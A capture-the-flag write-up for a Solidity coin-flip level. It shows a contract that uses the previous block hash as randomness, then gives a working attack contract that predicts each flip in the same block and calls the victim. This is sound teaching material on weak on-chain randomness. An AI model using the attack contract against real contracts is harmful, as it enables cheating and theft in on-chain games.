This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

  Things that might help

-   See the Help page above, section "Beyond the console"

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```




**SOLUTION:**

The goal of this level is to guess result of `side` correctly 10 times in a row. The chance of this happening is 0.5^10 or 0.0009765625% which _could_ happen but very very unlikely. 

Fortunately for us, the contract has a flaw with their flipping algorithm, specifically relying on `block.number` as a form of randomness. A malicious user can always calculate the correct answer if they run the same algorithm in their attack function before calling your flip function. 

We can find the contract address but typing "contract" in the Developer Console. In out case is `0x3Fa0b72EC0f46192a09C2cc229d822EA72a711c6`

We deploy the following contract on remix (with Injected Provider) and call the `attack` function to take over the victim contract. The transaction must be confirmed.

```
pragma solidity ^0.8.0;

contract AttackCoinflip {
    address victim = 0x3Fa0b72EC0f46192a09C2cc229d822EA72a711c6;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        // This is the same algorithm that is used by the victim contract
        // I am calculating the value for side before calling the victim contract.
        // This will always be correct because both functions are called in the same block.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Normally you would use import the contract here so that you can call the
        // function directly but if you're lazy like me, you call call the function
        // like this as well. This approach is useful for when you don't have access
        // to the source code of the contract you want to interact with.
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = victim.call{value: 0 ether}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```


We verify that we solved the challenge by clicking the "Submit Instance" button, verifying the transaction and waiting to be confirmed.


